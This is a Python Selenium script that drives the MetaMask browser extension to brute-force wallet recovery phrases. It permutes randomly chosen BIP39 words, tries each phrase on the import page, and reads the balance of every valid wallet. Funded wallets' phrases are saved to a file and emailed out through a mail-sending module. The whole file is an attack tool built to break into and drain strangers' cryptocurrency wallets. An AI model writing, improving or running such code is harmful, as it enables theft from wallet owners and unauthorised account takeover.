from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import pandas as pd
import mailsender
import random

#!!!
import functions as mf  # this file 'functions.py' is in the same folder. it is required for this program to run

#!!!
EXTENSION_PATH = r"/home/silox/.config/google-chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/10.20.0_0.crx"

mm_extension_id = (
    "nkbihfbeogaeaoehlefnkodbefgpgknn"  # enter your metamask extension id here
)

opt = webdriver.ChromeOptions()
opt.add_extension(EXTENSION_PATH)
opt.add_experimental_option("extensionLoadTimeout", 60000)
# chrome_options.add_argument("--disable-extensions")
opt.add_argument("--headless=chrome")
opt.add_argument("--disable-gpu")
opt.add_argument("--no-sandbox")  # linux only
opt.add_argument(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)


def brute_force_metamask(starting_unix_timestamp, time_limit_seconds=86400):
    driver = webdriver.Chrome(options=opt)
    driver.switch_to.window(driver.window_handles[1])  # switch to first window
    driver.get(
        "chrome-extension://"
        + mm_extension_id
        + "/home.html#initialize/create-password/import-with-seed-phrase"
    )  # go to seed phrase page
    time.sleep(2)
    driver.find_element(
        by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]'
    )  # select textbox

    # ENTER SEED WORDS, current COUNT:
    seed_words = []
    seed = []

    with open("english.txt") as wordlist:
        for line in wordlist:
            if len(line.strip()):
                seed.append(line.strip())

    seedCounter = 0
    while seedCounter < 1:
        while len(seed_words) < 12:
            wordChoice = random.choice(seed)
            seed_words.append(wordChoice)
        seedCounter += 1

    password = "12345678"
    count = 1  # starts at 1, input 'n' to start at 'n'th permutation
    # EDITABLE ^^^

    keys = [i for i in range(1, 13)]
    seed_words = dict(zip(keys, seed_words))

    s = ""
    arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
    # get starting point:
    arr = mf.getPermutation(len(arr), count)

    # print starting string and starting array:
    print("START:", arr, [seed_words[i] for i in arr])

    # loop through permuations:
    t0 = time.time()
    looper = True
    while looper:
        # populate string:
        s = ""
        for i in arr:
            s += " " + seed_words[i]
        s = s.strip()
        x = False
        while x == False:

            if starting_unix_timestamp + time_limit_seconds < int(time.time()):
                return

            try:
                element = driver.find_element(
                    by=By.XPATH, value='//*[@id="import-srp__srp-word-0"]'
                )
                element.send_keys(Keys.CONTROL + "a")
                element.send_keys(s.replace(" ", "\t\t"))  # paste string
                x = True
            except:
                x = False

            try:
                elem = driver.find_element(
                    by=By.XPATH, value="/html/body/div[1]/section/h2/span"
                )  # IF PAGE LOADS ERROR PAGE IT REFRESHES
                driver.refresh()
            except:
                pass

            try:
                elem = driver.find_element(
                    by=By.XPATH, value="/html/body/div[1]/div/div[3]/div/div/div[1]/div"
                )  # IF PAGE LOADS ERROR PAGE IT REFRESHES
                driver.get(
                    "chrome-extension://" + mm_extension_id + "/home.html#restore-vault"
                )
            except:
                pass

        # if invalid seed phrase:
        try:
            driver.find_element(
                by=By.CSS_SELECTOR,
                value="#app-content > div > div.main-container-wrapper > div > div > div > form > div.import-srp__container > div.actionable-message.actionable-message--danger.import-srp__srp-error.actionable-message--with-icon",
            )  # check to see if invalid message pops up
            # get next perm, increment
            arr = mf.nextPermutation(arr)
            print("Attempts", count, end="\r", flush=False)
            print(
                "count/sec:",
                "{:.2f}".format(count / (time.time() - t0)),
                "---- count:",
                count,
                end="\r",
                flush=True,
            )
            count += 1

        # if valid seed phrase:
        except:
            # enter into wallet:
            driver.find_element(by=By.XPATH, value='//*[@id="password"]').send_keys(
                password
            )  # enter pass
            driver.find_element(
                by=By.XPATH, value='//*[@id="confirm-password"]'
            ).send_keys(
                password
            )  # enter pass2

            try:  # after first login, check box disapears
                driver.find_element(
                    by=By.XPATH,
                    value="/html/body/div[1]/div/div[2]/div/div/div[2]/form/div[3]/input",
                ).click()  # click check box
            except:
                pass

            try:  # after first login, import btn -> restore btn
                driver.find_element(
                    by=By.CSS_SELECTOR,
                    value="#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > button",
                ).click()  # click import
            except:
                pass

            try:
                driver.find_element(
                    by=By.XPATH,
                    value='//*[@id="app-content"]/div/div[3]/div/div/div/form/button',
                ).click()  # click restore
            except:
                pass

            # HERE we need to wait for the restore process to load!!
            time.sleep(
                1
            )  # this can be adjusted in accordance to your network and machine speed

            try:  # after first login, click all done disapears
                driver.find_element(
                    by=By.CSS_SELECTOR,
                    value="#app-content > div > div.main-container-wrapper > div > div > button",
                ).click()  # click all done
            except:
                pass

            # once in wallet
            z = False
            while z == False:

                if starting_unix_timestamp + time_limit_seconds < int(time.time()):
                    return

                try:  # after first login, check box disapears
                    driver.find_element(
                        by=By.XPATH,
                        value="/html/body/div[1]/div/div[2]/div/div/div[2]/form/div[3]/input",
                    ).click()  # click check box

                except:
                    pass

                try:  # after first login, import btn -> restore btn
                    driver.find_element(
                        by=By.CSS_SELECTOR,
                        value="#app-content > div > div.main-container-wrapper > div > div > div.first-time-flow__import > form > button",
                    ).click()  # click import
                except:
                    pass

                try:
                    driver.find_element(
                        by=By.XPATH,
                        value='//*[@id="app-content"]/div/div[3]/div/div/div/form/button',
                    ).click()  # click restore
                except:
                    pass

                # HERE we need to wait for the restore process to load!!
                time.sleep(1)

                try:  # after first login, click all done disapears
                    driver.find_element(
                        by=By.CSS_SELECTOR,
                        value="#app-content > div > div.main-container-wrapper > div > div > button",
                    ).click()  # click all done
                except:
                    pass

                try:
                    elem = driver.find_element(
                        by=By.XPATH,
                        value="/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[1]/div/div/div/div[2]/span[2]",
                    )  # find balance element
                    z = True
                    break
                except:
                    z = False

                try:
                    elem = driver.find_element(
                        by=By.XPATH,
                        value="/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[1]/div/div/div/div/div/span[2]",
                    )  # IF PAGE LOADS PREMATURELY WITHOUT BALANCE IT REFRESHES
                    driver.refresh()
                except:
                    pass

                try:
                    elem = driver.find_element(
                        by=By.XPATH, value="/html/body/div[1]/section/h2/span"
                    )  # IF PAGE LOADS ERROR PAGE IT REFRESHES
                    driver.refresh()
                except:
                    pass

            print(elem.text[1:])
            usd = float(elem.text[1:])  # get balance usd
            if usd == 0.00:
                df = pd.DataFrame({count: [s]})
                df.to_csv("validacc.csv", mode="a", index=True, header=True)
                arr = mf.nextPermutation(arr)
                looper = True
                print(count, "empty account:", s)
                count += 1

                try:  # after first login, popup disapears
                    driver.find_element(
                        by=By.XPATH,
                        value='//*[@id="popover-content"]/div/div/section/div[1]/div/button',
                    ).click()  # exit pop-up
                except:
                    pass
                driver.find_element(
                    by=By.XPATH,
                    # value="/html/body/div[1]/div/div[1]/div/div[2]/div[2]/div/div",
                    value="/html/body/div[1]/div/div[1]/div/div[2]/button/div",
                ).click()  # click on profile
                driver.find_element(
                    by=By.XPATH, value='//*[@id="app-content"]/div/div[3]/div[2]/button'
                ).click()  # click 'lock' account
                time.sleep(0.01)
                driver.get(
                    "chrome-extension://" + mm_extension_id + "/home.html#restore-vault"
                )
            else:
                looper = False
                df = pd.DataFrame({count: [s]})
                df.to_csv("goodacc.csv", mode="a", index=True, header=True)
                mailsender.sendemail(s)
                print("DONE", s, "$", str(usd))
                print(count)


if __name__ == "__main__":
    brute_force_metamask(int(time.time()))
